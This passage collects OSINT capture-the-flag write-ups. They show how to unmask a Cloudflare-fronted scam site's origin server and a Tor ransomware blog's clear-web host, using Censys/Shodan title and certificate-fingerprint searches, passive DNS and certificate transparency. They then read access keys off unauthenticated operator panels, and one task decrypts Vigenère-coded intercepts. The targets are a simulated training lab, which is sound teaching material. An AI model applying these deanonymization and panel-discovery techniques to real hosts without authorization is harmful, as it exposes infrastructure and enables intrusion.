**Tools used**

dig; Censys web search in a browser; curl, grep.

**Approach / walkthrough**

1. **See only the Cloudflare front.** DNS gives nothing but the proxy, so the page's unique title is the search handle:

   ```sh
   dig A cs-adwi-covsec-lab-1.eu +short     # 104.21.40.96 / 172.67.183.210 (Cloudflare)
   dig NS cs-adwi-covsec-lab-1.eu +short    # ganz / pam.ns.cloudflare.com
   ```

   The proxied page's title, `NestEgg Capital | Reg. No. NEC-7731-0049`, is unique to this lab, and the real origin serves the exact same page — the crack in the setup.

2. **Find the origin in Censys.** Anonymous scripted fetches of the search page get Cloudflare-challenged, so open `https://search.censys.io` in a browser and search the web-property index for `NestEgg Capital`. The results are backed by a single host. Most rows are name collisions (`nestegg.capital`, itself behind Cloudflare showing "521: Web server is down"; `nestegg-capital.com`). The rows that matter:

   ```
   185.146.86.118 : 80                         WEB PROPERTY
     HTML Title  NestEgg Capital | Reg. No. NEC-7731-0049   Endpoints (1) /   Software F5 Nginx
   cw185-adf-hf118.romania-webhosting.com : 80 WEB PROPERTY   (same page, same title)
   ```

   `185.146.86.118` serves the NestEgg page directly on port 80, no Cloudflare in the way — same title, same single endpoint `/`, same "F5 Nginx" label; network facet `ClausWEB - CLAUS WEB srl`, Romania, matching the `romania-webhosting.com` PTR. That is the unique origin from Task 2. (Optional check: `curl` it with a `Host: cs-adwi-covsec-lab-1.eu` header returns the same bytes the Cloudflare front serves.)

3. **Read the origin's ports off the same result.** The facet summary lists one host and three TCP services:

   ```
   PORTS  22 (1)   80 (1)   8080 (1)      PROTOCOLS  HTTP 2   SSH 1
   ```

   SSH on 22, the scam site on 80, and a second HTTP service on 8080. The back office can only live on 8080 — learned from the scanner's index, without sending a packet at the target.

4. **Open the back office and take the key.**

   ```sh
   curl http://185.146.86.118:8080/ | grep -A3 "admin key"
   ```

   Port 8080 is the operator's CRM panel, titled `NestEgg CRM | Backend`, with no login. Its dashboard shows the hot-wallet admin key verbatim; grep pulls that block out. The key is `t2YGg14buPVPPnd9uvazWcdvT9UMCh3J`. Wrap it in the flag format.

**Why it works**

Cloudflare hides the origin from DNS, but internet-wide scanners index the origin directly, every open port included. The site's title is unique, so one passive title search names the box and lists its ports; the operator left the back office on a second HTTP port of the same server with no authentication. Discovery costs the target nothing — origin, ports and the panel's port all come from the public index, and the only request sent is the single GET the brief allows, aimed at a port the scanner already named. The panel then prints its own key, exactly as the boundary requires.

**Validation / reproduction**

The key was copied verbatim from the panel, as the boundary requires, with no path enumeration or generated candidates. The panel was reached through the single origin from Task 2 and the port the scan database listed. Accepted on the first submission. To reproduce: Censys title search → origin IP → read that host's service ports → `GET :8080/` and read the admin key.

### Cloudflare Deanon: Find the Origin

> OSINT · Medium · Created by [Covert Security](https://covsec.ee)  
> Points: 320 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{185.146.86.118}`

**Challenge**

Task 2 of the lab: find the one clear-web IP serving the NestEgg site, which sits behind Cloudflare. The target domain, `cs-adwi-covsec-lab-1.eu`, comes from Task 1. The answer boundary: submit the one clear-web IPv4 origin that serves the NestEgg site — not a Cloudflare edge, DNS resolver, historical address, or guess.

**Tools used**

dig, curl, openssl, jq, whois; Censys web search in a browser.

**Approach / walkthrough**

1. **Record match handles and confirm Cloudflare.** Save the proxied page's body hash and unique title; they are how you will recognize the origin.

   ```sh
   D=cs-adwi-covsec-lab-1.eu
   curl -s -D headers.txt https://$D/ -o index.html; sha256sum index.html; grep -o '<title>[^<]*' index.html
   for t in A AAAA NS MX TXT; do echo "== $t"; dig +short $D $t; done
   ```

   Body hash `eada5319c75d6aa4f5a3aaece4eaa034309fd5374c03bf27228ab6897c029c1e`, title `NestEgg Capital | Reg. No. NEC-7731-0049`. DNS is all Cloudflare: A/AAAA are Cloudflare anycast, nameservers are `ganz`/`pam.ns.cloudflare.com`, no MX/TXT, and `www` does not resolve. DNS alone cannot reach the origin.

2. **Mine Certificate Transparency.** crt.sh served only two rows then errored, so use Cert Spotter for the full set:

   ```sh
   curl -s "https://api.certspotter.com/v1/issuances?domain=$D&include_subdomains=true&expand=dns_names&expand=issuer" \
     | jq -c '.[] | {nb:.not_before,dns:.dns_names,iss:.issuer.friendly_name}'
   ```

   Four certs: an Oct 8 apex + an Oct 8 `www` (Let's Encrypt), an Oct 21 wildcard (Let's Encrypt), and an Oct 22 wildcard (Sectigo). Checking what the edge actually serves (`openssl s_client -connect $D:443 -servername $D`) shows the Oct 21 Let's Encrypt wildcard is the edge cert and the Oct 22 Sectigo is Cloudflare's Universal-SSL backup — leaving the Oct 8 apex+www pair as the only pre-proxy certificates, and no origin-specific cert anywhere in the logs.

3. **Follow the pre-proxy `www` record — into a decoy.** HackerTarget passive DNS still remembers it:

   ```sh
   curl -s "https://api.hackertarget.com/hostsearch/?q=$D"
   ```

   ```
   cs-adwi-covsec-lab-1.eu,104.21.40.96      (Cloudflare edge)
   www.cs-adwi-covsec-lab-1.eu,185.31.240.240
   ```

   `whois 185.31.240.240` → `EE-ZONE-HOSTING / Zone Media LLC` (AS49604, Estonia), PTR `vs-dip-240-240.rid10.zonevs.eu`. One request with the lab's SNI and Host returns a `<title>Domain is Registered</title>` registrar-parking page serving the Oct 8 cert. So the Oct 8 certs belong to the domain's registrar-parking era — a historical address, exactly what the boundary forbids. Dead end, and a filter for everything downstream. urlscan, common subdomains, mnemonic/OTX passive DNS and robots all leak only the edge.

4. **Deduce and pivot on content.** No origin cert in CT and no DNS leak means the origin speaks plain HTTP or uses a Cloudflare Origin CA cert that never enters public logs. You cannot find it by name — find it by content, using the unique page title. Shodan's anonymous facet for `http.title:"NestEgg"` lists `185.146.86.118` among its top IPs (corroboration, but a facet alone proves nothing, and further queries hit the login wall). Censys gives the readable answer: a scripted fetch is Cloudflare-challenged (403), so open `https://search.censys.io/search?resource=hosts&q="NestEgg Capital"` in a browser (redirects to platform.censys.io, no account needed). Of 11 results, most are Cloudflare-fronted NestEgg properties (`nestegg.capital` showing "521: Web server is down", `nestegg-capital.com`, etc.). One is different:

   ```
   185.146.86.118 : 80   WEB PROPERTY
     HTML Title  NestEgg Capital | Reg. No. NEC-7731-0049     Software (1) F5 Nginx
     MATCHED FIELDS  web.endpoints.http.body / html_tags / html_title
   185.146.86.118   HOST   cw185-adf-hf118.romania-webhosting.com
     ClausWEB - CLAUS WEB srl (203053)   Bucharest (RO)   SERVICES (3) 22/SSH 80/HTTP 8080/HTTP
   ```

   The NestEgg page indexed on plain port 80, at a Romanian shared host, with no Cloudflare labels — the only non-edge web property in the results.

5. **Confirm the origin.** Ask it directly over plain HTTP with the site's Host header:

   ```sh
   curl -s -H "Host: $D" http://185.146.86.118/ | sha256sum
   curl -s http://185.146.86.118/ | grep -o '<title>[^<]*'
   ```

   Body hash is the same `eada5319...` from step 1 and the title matches. Plain HTTP on port 80 also explains why it never appeared in a certificate log. The answer is `185.146.86.118`.

**Why it works**

Cloudflare's proxy hides the origin from DNS, and this origin never bought a public certificate — it serves over plain HTTP — so the CT route only surfaces the edge and a registrar-parking decoy. What the proxy cannot hide is content: internet-wide scanners crawl port 80 too, and Censys indexed the NestEgg page by its unique title on a Romanian host that no current DNS record points to. One Host-header request whose body hash matches the proxied page pins the origin.

**Validation / reproduction**

The candidate serves the byte-identical page (same `eada5319...` hash, same title) as the proxied site, under a non-Cloudflare AS — distinguishing it from the registrar-parking decoy (different page, old Oct 8 cert) and from the other Cloudflare-fronted NestEgg name collisions. Accepted on the first submission. Gotcha: the `www`/CT trail leads to the Estonian parking decoy — a deliberate historical dead end — so the title/content pivot, not the certificate route, is what names the real box.

### Cloudflare Deanon: Read the Platform

> OSINT · Easy · Created by [Covert Security](https://covsec.ee)  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{NEC-7731-0049}`

**Challenge**

Task 1 of the Cloudflare-deanon lab. NestEgg Capital is a fake investment platform ("guaranteed returns, paid weekly") sitting behind Cloudflare. A fraud alert and a call note set the scene; the call note names the public site, `https://cs-adwi-covsec-lab-1.eu`, and claims it is "licensed by the Lower Dunwich Financial Supervisory Board". Despite the "deanon" framing, this task asks only for the company registration number *advertised by the platform*, and the answer boundary says to submit it exactly as the public site displays it — not a registry lookup, historical result, or guess.

**Tools used**

curl, grep.

**Approach / walkthrough**

1. **Read the task, not the title.** The title and fraud story tease an origin hunt, but Task 1 asks for "the company registration number advertised by the NestEgg Capital platform", and the boundary pins the source to the live public site. The origin hunt is for the later tasks; here the homepage *is* the source. "Stay passive" is satisfied by a single GET.

2. **Fetch the homepage once.**

   ```sh
   curl -sS -m 20 -L -A 'Mozilla/5.0' -D - https://cs-adwi-covsec-lab-1.eu/ -o index.html
   ```

   The response headers carry `server: cloudflare` and a `cf-ray` — confirming the proxy is real, and equally confirming it is irrelevant here: a reverse proxy still serves the full page content to any visitor.

3. **Grep for registration / licence wording.**

   ```sh
   grep -oiE '.{0,120}(regist|reg\.|company no|licen).{0,160}' index.html
   ```

   ```
   <title>NestEgg Capital | Reg. No. NEC-7731-0049</title>
   <meta name="description" content="NestEgg Capital, Reg. No. NEC-7731-0049. Guaranteed returns, paid weekly.">
     <div class="reg">Reg. No. NEC-7731-0049</div>
     Licensed by the Lower Dunwich Financial Supervisory Board | Licence LD-FSB-2210 | Reg. No. NEC-7731-0049
   ```

   The registration number appears in four places that all agree: the `<title>`, the meta description, a `Reg. No.` badge in the header, and the trust bar.

4. **Distinguish it from the decoy.** The same trust-bar line carries a second number, `Licence LD-FSB-2210` — the "Lower Dunwich Financial Supervisory Board" licence the call note mentions. The task asks specifically for the **company registration number**, which the site consistently prints as `Reg. No. NEC-7731-0049`. Drop the label, keep the number as displayed, and wrap it.

**Why it works**

Cloudflare hides the origin's IP, not the site's content — that is the point of a reverse proxy. The task asks for what the platform *advertises*, and a scam advertises its fake credentials as loudly as possible, pasting the registration number into the title, meta description, header badge and trust bar. So the shortest path is a single passive GET of the homepage: read what the platform says about itself and the answer falls out. The origin hunt the story teases is real work — for the rest of the series.

**Validation / reproduction**

Four independent spots on the page print the same registration number, so the value is unambiguous; the licence number is ruled out because the task asks for the company registration number specifically. Accepted on the first submission. To reproduce: one `curl` of the homepage, grep the registration lines, and take `NEC-7731-0049`. Gotcha: do not reflexively start DNS history / origin hunting — the boundary explicitly forbids a registry lookup or guess, and the site itself is the source of truth.

### Harvest

> OSINT · Not shown · Kevin Sander  
> Points: 270 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{PP-7_SNOP}`

**Challenge**

A regional Telegram channel published a photo of a Mi-24 carrying a sling load over a wheat field, claiming "bort 34" delivered cargo near the village of Staroselye on 14 August 2026. Your monitoring cell obtained seven files from a logistics officer's laptop (417th Separate Helicopter Squadron, aerodrome KORLEVO) plus two encrypted radio-net intercepts. Nothing needs to be hacked. The question: where did the squadron's sling-load cargo actually go on 14 August, and what was it? Flag format `CSCTF{PP-N_CODEWORD}` (example `CSCTF{PP-3_OVES}`).

**Tools used**

python3 (standard library), exiftool.

**Approach / walkthrough**

1. **Test the photo for a date/location.** `exiftool -EXIF:all -XMP:all -GPS:all -PNG:all 02_photo.png` returns only the bare PNG header — no EXIF, GPS, or text chunk. Nothing dates or places the shot. Visual inspection shows a white **34** on the fuselage, "ВКС РОССИИ" on the tail boom, green crates in slings over ripe wheat, and a domed church on the hill at the far right (≈ x 1560–1650). The picture is consistent with the post (bort 34, a church fitting Staroselye) but proves nothing about the date.

2. **Check the flight schedule (`03_flight_schedule_14AUG.txt`).** This alone sinks the post:
   - **Bort 34 (callsign VORON) did not fly.** It was U/S, main gearbox replacement, "not before 18.08".
   - The day's **sling loads were flown by Mi-8 transports, not a Mi-24**: bort 22 (ZHATVA) 09:00–10:55 with "LZ per separate order", and bort 25 (BEREG) 13:20–14:35 to PP-5. Bort 22's landing zone is deliberately left off the page.
   - **Nothing flew after 15:00** (thunderstorm warning 15:00–22:00).
   - Every crew has a daily callsign — that column holds the cipher keys.

3. **Read the logistics sheet (`05_logistics_sheet_14AUG.txt`).** Cargo is named only by code word (glossary: `SNOP` = portable EW jamming set, `KORZINA` = small-arms ammunition, `MESHOK` = rations/water, etc.). The loading plan has **bort 22 → 4 × SNOP, sling, to "PP per order"** (the same blank), bort 25 → 6 × MESHOK to PP-5, and no bort 34. Landing sites: **PP-2 is Staroselye, "pasture below the church" — CLOSED since 02.08 (mines, order 88)**; PP-7 is Mirnoe, harvested field west of the dairy farm. So the open question is where bort 22's four SNOP went — kept off paper, leaving the radio traffic.

4. **Learn the radio rules (`04_signals_instruction_extract.txt`).** Crew reports are Vigenère over the Latin alphabet on transliterated Russian, letter `X` marks a word boundary, and **the key is the sending crew's daily callsign**. Message format is a DTG `DDHHMM`, cipher text in five-letter groups, and a **check group equal to the number of groups**. Landing sites go by PP number only; **naming a settlement is prohibited**. A glossary lists the expected report words and spelled-out numbers.

5. **Read the intercepts (`06_intercepts_14AUG.txt`).** #1 (DTG 141020) was sent while bort 22 and its escort were airborne; its groups count 9+9+3 = 21, matching its check group 21. #2 (DTG 141630) was sent when nothing was flying; its groups count 9+9+7 = **25** against a check group of **24**.

6. **Decrypt both.** With only six callsigns, try each and score by how many `X`-separated words hit the glossary:

   ```python
   def vigenere_decrypt(text, key):
       return "".join(chr((ord(c) - ord(key[i % len(key)])) % 26 + ord("A"))
                      for i, c in enumerate(text))
   ```

   Each message has exactly one key that yields Russian:
   - **#1, key ZHATVA (bort 22):** `DOKLAD ZHATVA GRUZ SNOP CHETYRE MESTA DOSTAVLEN PP SEM VREMYA DESYAT DVADTSAT BORT DVADTSAT DVA KONEC` — "Report, ZHATVA. Cargo SNOP, four pieces, delivered to PP-7. Time 10:20. Bort 22. End."
   - **#2, key VORON (bort 34):** "Report, VORON. Cargo KORZINA, six pieces, delivered to PP-2 Staroselye. Time 16:30. Bort 34. End." — the trap: decrypts cleanly and tells exactly the Telegram story, so stopping here yields the plant's answer `CSCTF{PP-2_KORZINA}`.

7. **Hold each decrypt against the paperwork.** A second script re-runs every rule straight from the files:

   | Check | #1 (ZHATVA) | #2 (VORON) |
   |---|---|---|
   | Check group = number of groups | 21 = 21 ✓ | 24 ≠ 25 ✗ |
   | Sender airborne when sent | bort 22 09:00–10:55, sent 10:20 ✓ | bort 34 U/S all day ✗ |
   | Sent before 15:00 stop | 10:20 ✓ | 16:30 ✗ |
   | No settlement named | PP number only ✓ | names STAROSELYE ✗ |
   | Landing site open | PP-7 Mirnoe ✓ | PP-2 closed (mines) ✗ |
   | Cargo as loaded | 4 × SNOP, as planned ✓ | bort 34 had no load ✗ |

   Report #2 fails every check; report #1 passes all six and fills the "per order" blank. The genuine landing site is PP-7 and the cargo code word is SNOP.

**Why it works**

The public story (post + photo) and the planted intercept agree with each other, but the squadron's own working files contradict both: bort 34 was grounded, Staroselye's PP-2 was mined and closed, and the real destination was encrypted. The cipher is the easy part — Vigenère keyed by a crew callsign the schedule lists — so six trial decryptions break both messages. The real puzzle is which report to trust, and the planted #2 decrypts just as cleanly as #1. Cross-checking each against the records (check group, flight times, the 15:00 weather stop, the place-name ban, the minefield closure, the loading plan) leaves exactly one genuine report.

**Validation / reproduction**

A script re-runs all six checks straight from the files; only report #1 passes all of them, yielding `PP-7` and `SNOP` → `CSCTF{PP-7_SNOP}`. Accepted on the first submission. Bort 22's four portable jamming sets went to PP-7 (harvested field west of the dairy farm at Mirnoe) while the channel pointed everyone at Staroselye. Gotcha: both intercepts decrypt to valid Russian — the trap is to stop at the first clean decrypt (`#2`, matching the Telegram claim) instead of validating it against the schedule and logistics rules.

### Onion Deanon 1: Find the Back Office

> OSINT · Medium · Created by [Covert Security](https://covsec.ee)  
> Points: 329 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{db133256-5ed2-44bd-aaec-652a5213be0f}`

**Challenge**

Task 4, the last of the "Onion Deanon 1" lab. Find the operator's internal negotiation panel on the Task 3 origin (`185.146.87.136`) and retrieve its access token (a UUID). The answer boundary: use the unique origin from Task 3, the UUID must be shown verbatim by the panel, and you may not enumerate paths, use wordlists, or generate candidate tokens. That constraint is the hint — passive scan archives, not probing, are the intended route.

**Tools used**

tor (local SOCKS proxy), curl; Shodan and Censys host pages in a browser.

**Approach / walkthrough**

1. **Confirm the blog advertises no back office.** The onion leak blog (`4uybrxybehxbf...onion`) is a single static victim list — carrot logo, tagline, five victims, a "simulated training environment" footer, and crucially zero hyperlinks and zero scripts. The panel is not linked from the public site.

2. **Knock once on the clear-web front.** Directly fetching the origin shows a deliberate dead end:

   ```sh
   curl -sk https://185.146.87.136/ -D - -o ip_index.html
   ```

   nginx answers `200 OK` but the 765-byte body *displays* "403 — This service is only accessible via `.onion`, direct connections are not permitted." The same stub comes back under the PTR hostname (`--resolve cw185-adf-hg136.romania-webhosting.com:443:185.146.87.136`), the apex, the onion name as SNI, and `localhost`; plain HTTP on port 80 is refused. There is no vhost trick, and the brief forbids path guessing — so stop touching the box and read public records.

3. **Pull the host from Shodan — the trap.** `https://www.shodan.io/host/185.146.87.136` loads anonymously and shows only two open ports:

   ```
   Open Ports 22 443        Last Seen: 2026-10-28
   22/tcp OpenSSH 9.2p1 Debian ...   443 nginx ... 403 ...
   ```

   Stale (last banner 2026-10-28) and thin. Trusting one scanner here would conclude the origin is clean and no panel exists.

4. **Pull the same host from Censys — the fresher view.** A scripted fetch bounces off Cloudflare (HTTP 403, "Just a moment..."), so open `https://platform.censys.io/hosts/185.146.87.136` in a browser. Censys lists **three** services, observed 2026-11-07:

   ```
   3 Total Services   22 / SSH   443 / HTTP   8080 / HTTP
   ```

   The 443 record carries the familiar stub and the TLS fingerprint `14bfcd53...eb2380` / `CN=4uybrxyb...onion` — confirming it is the same box Task 3 pivoted on. The third record is the one Shodan never showed:

   ```
   HTTP 8080 / TCP   LAST OBSERVED NOV 07, 2026
   URI http://185.146.87.136:8080/   Status 200 OK   Path /
   HTML Title  ParsnipLocker Internal Ops
   ```

5. **Read the token off the archived panel.** Censys stores the full response body for that 8080 service. Its archived page is the operator's panel verbatim:

   ```html
   <title>ParsnipLocker Internal Ops</title>
   <h1>PARSNIPLOCKER INTERNAL NEGOTIATION PANEL</h1>
   <div class="warn">DO NOT EXPOSE. OPERATOR USE ONLY.</div>
   <table> ... Globex Artisanal Mayonnaise Co. | PL-0091 | 0.8 XMR | negotiating ... </table>
   <div class="token-box">
     Access Token: <span class="token">db133256-5ed2-44bd-aaec-652a5213be0f</span>
   </div>
   ```

   The UUID is read straight from the archive — no port scan (Censys already enumerated 8080), no path guess (the panel is at `/`), no wordlist. Wrap it in the flag format.

**Why it works**

The crew ran the public leak blog and their internal negotiation panel on the same origin box. Tor hides the blog's location but cannot stop that box from exposing other services on its clear-web IP — and internet-wide scanners archive whatever they see, response bodies included. Shodan's snapshot is thin and stale, so it looks like there is nothing to find; Censys observed the box the same day and kept a full record for port 8080, panel and token included. The 443 "onion-only" stub guards direct browsing but cannot scrub an archive that already stored the panel. The lesson: never call an origin clean after checking a single scanner — cross-reference a second one.

**Validation / reproduction**

The token is read verbatim from the archived panel (the answer boundary requires the panel show it), reached via the single origin from Task 3 on a port the scanner already recorded — satisfying the no-scan/no-wordlist rule. Accepted on the first submission. To reproduce: take Task 3's origin, open its host page on Censys, find the 8080 service's archived response body, and copy the Access Token. Gotcha: Shodan alone would have hidden the 8080 service entirely — the whole task turns on checking a second, fresher scan archive.

### Onion Deanon 1: Find the Origin

> OSINT · Medium · Created by [Covert Security](https://covsec.ee)  
> Points: 309 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{185.146.87.136}`

**Challenge**

Task 3 of the "Onion Deanon 1" lab. Locate the real server hosting the ParsnipLocker leak blog and submit its clear-web IPv4. The answer boundary is strict: submit the one clear-web IPv4 that presents the same leaf certificate from Task 1 — not an onion relay, DNS resolver, CDN address, historical certificate host, or a guessed address. No files ship; the task plays out against the live onion service and public scan databases.

**Tools used**

tor (local SOCKS proxy), curl, openssl; Censys web search in a browser.

**Approach / walkthrough**

1. **Re-establish the certificate.** Reach the blog over Tor and capture its leaf exactly as in Tasks 1–2:

   ```sh
   O=4uybrxybehxbf646wqbnyjxyjk2xis6mpvo4d57dv25zf5jsazf5tsad.onion
   tor --SocksPort 19050 --DataDirectory tor-data &
   curl -sk --socks5-hostname 127.0.0.1:19050 "https://$O/" -o /dev/null -w '%{certs}' > certs.txt
   awk '/BEGIN CERT/,/END CERT/' certs.txt > leaf.pem
   openssl x509 -in leaf.pem -noout -serial -fingerprint -sha256
   ```

   ```
   serial=6FDBE5407014B76F971FAFC7E888BD66FEC5D2FD
   sha256 Fingerprint=14:BF:CD:53:D5:09:FE:DF:0C:A4:FE:7E:9A:3D:6F:E2:A0:45:1F:4E:DA:F7:76:39:EB:BC:0F:ED:93:EB:23:80
   ```

   The onion page itself is a static nginx victim list (Content-Length 2944) with no address, links or scripts in it — do not burn time reading the HTML. The usable artifact is the self-signed certificate.

2. **Pick the right database.** The SHA-256 fingerprint `14bfcd53d509fedf0ca4fe7e9a3d6fe2a0451f4edaf77639ebbc0fed93eb2380` (lowercase, no colons) is the search key. Because the certificate is self-signed, it was never logged in Certificate Transparency, so crt.sh is useless. Shodan without an account won't run certificate filters ("Please log in to use search filters"), and scripted requests to the old `search.censys.io` hit a Cloudflare "Just a moment..." browser check (HTTP 403). The modern Censys platform, however, is anonymously viewable in an ordinary browser.

3. **Search Censys for the fingerprint.** Open the related-assets / search view directly, with the fingerprint in quotes so it is matched as an exact phrase:

   ```
   https://platform.censys.io/search?q="14bfcd53d509fedf0ca4fe7e9a3d6fe2a0451f4edaf77639ebbc0fed93eb2380"
   ```

   The result (as of the event, Nov 2026) is exactly **one host**, matched on `host.services.cert.fingerprint_sha256`, in a Romanian hosting AS:

   ```
   185.146.87.136          HOST
   Network (AS)  ClausWEB - CLAUS WEB srl (203053)   Bucharest (RO)
   SERVICES (3)  22 / SSH   443 / HTTP   8080 / HTTP
   MATCHED FIELDS  host.services.cert.fingerprint_sha256
                   14bfcd53d509fedf0ca4fe7e9a3d6fe2a0451f4edaf77639ebbc0fed93eb2380
   ```

   The same search lists three web properties — the IP on 443 plus two hostnames (`cloud.alanarent.ro` and the hoster's reverse-DNS `cw185-adf-hg136.romania-webhosting.com`) — all one server under different names, all matched on `web.cert.fingerprint_sha256`.

4. **Resolve against the answer boundary.** The boundary asks for the clear-web IPv4. The two hostnames are names for the same machine (an older domain and the hoster's PTR, whose `cw185`/`hg136` echo ClausWEB) — submitting one would be the "historical certificate host" the brief rules out. The Hosts facet counts a single machine; its IPv4 is the answer. Confirm with one TLS handshake to that host only and check the leaf matches Tasks 1–2:

   ```sh
   openssl s_client -connect 185.146.87.136:443 </dev/null 2>/dev/null | openssl x509 -noout -serial -fingerprint -sha256
   ```

   Serial, SHA-256 fingerprint and CN all match exactly. Over plain HTTP that IP answers with a "403 — only accessible via .onion" stub, but its TLS service still hands out the ParsnipLocker certificate to every scanner.

**Why it works**

Tor hides the route to the blog, not the server's other exposures. The crew serves the same nginx site — with the same self-signed leaf — on a clear-web IP, and scanners like Censys record the SHA-256 fingerprint of every TLS service they meet on every public port. A self-signed certificate is unique to its owner: no CA shares it and no other host can legitimately present it, so one fingerprint search collapses the onion address, an old domain and a hosting PTR name into a single origin box. A hidden service stays hidden only as long as the server never says anything identifying about itself anywhere else — and its TLS certificate talks to every scanner that knocks.

**Validation / reproduction**

Exactly one host in the scan database presents that fingerprint, and a direct TLS handshake to it returns the identical leaf (same serial, fingerprint and CN as Tasks 1–2). The other matches are hostnames for the same machine, not the requested IPv4. Accepted on the first submission. To reproduce: compute the leaf fingerprint over Tor, paste its lowercase no-colon form in quotes into the Censys platform search, take the single Hosts result's IP, and verify with one `openssl s_client` to that host. Gotcha: the fingerprint must be lowercase with no colons for the Censys query, and scripted fetches of the old Censys/Shodan endpoints are blocked — use a browser against `platform.censys.io`.

### Onion Deanon 1: Fingerprint the Certificate

> OSINT · Easy · Created by [Covert Security](https://covsec.ee)  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

`CSCTF{14:BF:CD:53:D5:09:FE:DF:0C:A4:FE:7E:9A:3D:6F:E2:A0:45:1F:4E:DA:F7:76:39:EB:BC:0F:ED:93:EB:23:80}`

**Challenge**

Task 2 of the "Onion Deanon 1" lab, a continuation of Task 1 (same ParsnipLocker briefing and the same onion leak blog, `4uybrxybehxbf646wqbnyjxyjk2xis6mpvo4d57dv25zf5jsazf5tsad.onion`). The task wants the SHA-256 fingerprint of that same leaf certificate, uppercase hexadecimal with colons (e.g. `AA:BB:...`).

**Tools used**

tor (local SOCKS proxy), curl, openssl.

**Approach / walkthrough**

This task reuses the exact certificate Task 1 already pulled over Tor — no new contact with the target is needed, which keeps it inside the passive scope. A certificate fingerprint is just the SHA-256 digest of the DER-encoded leaf, so it is a deterministic function of bytes already on disk.

1. **Reuse the leaf from Task 1.** Task 1 captured the presented certificate with one passive GET through the Tor SOCKS proxy (`curl --socks5-hostname ... -w '%{certs}'`) and saved it as `onion_cert.pem`. If that file is gone, re-fetch it the same way; the handshake is deterministic and returns the identical self-signed leaf.

2. **Compute the SHA-256 fingerprint.** openssl digests the DER form of the certificate and prints it colon-separated, which is exactly the required format:

   ```sh
   openssl x509 -in onion_cert.pem -noout -fingerprint -sha256
   ```

   ```
   sha256 Fingerprint=14:BF:CD:53:D5:09:FE:DF:0C:A4:FE:7E:9A:3D:6F:E2:A0:45:1F:4E:DA:F7:76:39:EB:BC:0F:ED:93:EB:23:80
   ```

   Strip the `sha256 Fingerprint=` label and wrap the rest. (For cross-reference, the SHA-1 fingerprint of the same leaf is `C9:50:D9:28:97:49:37:D5:C4:E9:B0:F7:BF:B3:DD:47:16:16:8F:58`, and the serial from Task 1 is `6FDBE5407014B76F971FAFC7E888BD66FEC5D2FD` — all three identify one certificate.)

**Why it works**

The fingerprint is the SHA-256 hash of the exact DER certificate the service presents. Because it is computed over bytes already captured in Task 1, it is fully reproducible offline, with no further request to the hidden service. That determinism is the whole point: the same leaf, served on any host, hashes to this same value. This fingerprint becomes the search key Task 3 uses against internet-wide scan databases (Censys indexes every TLS certificate it observes by its SHA-256 fingerprint), which is how the clear-web origin behind the onion gets found.

**Validation / reproduction**

The fingerprint is computed directly from the leaf whose subject and issuer both match the onion name, so there is no ambiguity about which certificate was hashed. Accepted on the first submission (manual CLI submit by secretNinja). To reproduce: take the `onion_cert.pem` from Task 1 (or re-pull it over Tor) and run `openssl x509 -noout -fingerprint -sha256`; openssl emits the colon-separated uppercase form the task asks for with no reformatting needed. The lowercase, colon-stripped form of this same digest (`14bfcd53d509fedf0ca4fe7e9a3d6fe2a0451f4edaf77639ebbc0fed93eb2380`) is what later tasks paste into Censys.

### Onion Deanon 1: Read the Certificate

> OSINT · Easy · Created by [Covert Security](https://covsec.ee)  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

`CSCTF{6FDBE5407014B76F971FAFC7E888BD66FEC5D2FD}`

**Challenge**

Task 1 of the four-part "Onion Deanon 1" lab. A ransomware crew called ParsnipLocker runs its leak blog as a Tor hidden service over HTTPS. The scope is a simulated environment operated by Covert Security: reach the onion service with Tor, stay passive (no port scan, brute force or probing), and treat only the single host you identify as in scope. The recovered ransom note hands you the address:

```
=== YOUR NETWORK HAS BEEN PARSNIPPED ===
Hello, Globex Artisanal Mayonnaise Co.
...
You have 72 hours. Pay 0.8 XMR or we publish everything you own on our blog. Tor Browser required:
https://4uybrxybehxbf646wqbnyjxyjk2xis6mpvo4d57dv25zf5jsazf5tsad.onion
Case ID: PL-0091
- ParsnipLocker
```

The task asks for the serial number of the certificate the blog presents, uppercase hexadecimal, no colons or spaces.

**Tools used**

tor (local SOCKS proxy), curl, openssl.

**Approach / walkthrough**

1. **Decide where the certificate lives.** The instinct for a certificate lookup is crt.sh, but two things rule it out here: crt.sh returned HTTP 429, and more importantly a self-signed onion certificate is never issued by a CA and so never enters Certificate Transparency in the first place. There is nothing to look up remotely — the certificate has to be read straight off the service.

2. **Start a private Tor daemon.** Tor Browser is the intended client, but a plain `tor` daemon with its own SOCKS port is easier to script and keeps the fetch minimal. Give it a non-default port so it will not collide with any other tor:

   ```sh
   tor --SocksPort 19066 --DataDirectory <scratch>
   ```

   Wait for the `Bootstrapped 100% (done)` line before going on.

3. **Make one passive GET and capture the presented leaf.** curl's `%{certs}` write-out variable is the clean way to grab the certificate chain through a SOCKS proxy (it sidesteps an `openssl s_client -proxy` quirk on macOS that otherwise fails with "Could not find or decode certificate"):

   ```sh
   O=4uybrxybehxbf646wqbnyjxyjk2xis6mpvo4d57dv25zf5jsazf5tsad.onion
   curl -sk --socks5-hostname 127.0.0.1:19066 -w '%{certs}' "https://$O/" > certs.txt
   awk '/BEGIN CERT/,/END CERT/' certs.txt > onion_cert.pem
   ```

   This is a single ordinary GET to the one in-scope host — nothing scanned, nothing probed. The curl verbose log already shows the handshake details: `subject: CN=<onion>`, `issuer: CN=<onion>`, and `SSL certificate verify result: self signed certificate (18), continuing anyway`.

4. **Read the serial.** With the leaf saved, openssl prints the field directly:

   ```sh
   openssl x509 -in onion_cert.pem -noout -serial
   ```

   ```
   serial=6FDBE5407014B76F971FAFC7E888BD66FEC5D2FD
   ```

   The subject and issuer are both `CN=4uybrxybehxbf646wqbnyjxyjk2xis6mpvo4d57dv25zf5jsazf5tsad.onion` (confirming this is the service's own self-signed leaf, not an intermediate), it is RSA-2048, valid 2026-10-21 → 2036-10-18, with subject-key-identifier `DA:33:82:2D:BC:8D:9A:C7:5A:3E:AE:3C:F4:C0:85:12:D4:4C:31:05`. openssl already emits the serial in the exact required form — uppercase hex, no colons — so it goes straight into the flag wrapper.

